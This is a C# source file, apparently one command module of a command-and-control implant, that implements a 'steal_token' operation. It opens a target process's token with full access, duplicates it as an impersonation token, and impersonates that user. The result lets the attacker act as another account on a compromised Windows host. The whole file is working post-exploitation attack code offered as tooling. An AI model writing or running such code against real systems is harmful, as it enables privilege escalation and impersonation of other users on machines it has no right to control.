using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using Engineer.Extra;
using Engineer.Models;

namespace Engineer.Commands
{
    internal class Steal_Token : EngineerCommand
    {
        public override string Name => "steal_token";

        public override string Execute(EngineerTask task)
        {
            try
            {
				if (!task.Arguments.TryGetValue("/pid", out string pidstring))
				{
					return "error: " + "Missing pid";
				}
				pidstring.TrimStart(' ');
				if (!int.TryParse(pidstring, out int pid))
				{
					return "error: " + "Failed to parse pid";
				}

				// open handle to process
				var hProcess = Process.GetProcessById(pid);

				//open handle to token
				if (!WinAPIs.Advapi.OpenProcessToken(hProcess.Handle, WinAPIs.Advapi.TOKEN_ALL_ACCESS, out var hToken))
				{
					return "error: " + "Failed to open process token";
				}
				//duplicate token
				var sa = new WinAPIs.Advapi.SECURITY_ATTRIBUTES();
				if (!WinAPIs.Advapi.DuplicateTokenEx(hToken, WinAPIs.Advapi.TOKEN_ALL_ACCESS, ref sa, WinAPIs.Advapi.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, WinAPIs.Advapi.TOKEN_TYPE.TokenImpersonation, out var hTokenDup))
				{
					WinAPIs.Kernel32.CloseHandle(hToken); // close the open handle we have since we failed duplication.
					hProcess.Dispose();
					return "error: " + "failed to duplicate token";
				}

				//impersonate token , just like make token
				if (WinAPIs.Advapi.ImpersonateLoggedOnUser(hTokenDup))
				{
					var identity = new WindowsIdentity(hTokenDup);
					identity.Impersonate();
					WinAPIs.Kernel32.CloseHandle(hToken); // can close now that we have successfully impersonated.
					hProcess.Dispose();
					return $"Successfully impersonated {identity.Name}";
				}

				//close handle , should get here only if impersonate fails.
				WinAPIs.Kernel32.CloseHandle(hToken);
				hProcess.Dispose();
				return "error: " + "failed to impersonate token";
			}
            catch (Exception ex)
            {
                return "error: " + ex.Message;
            }
		}
    }
}
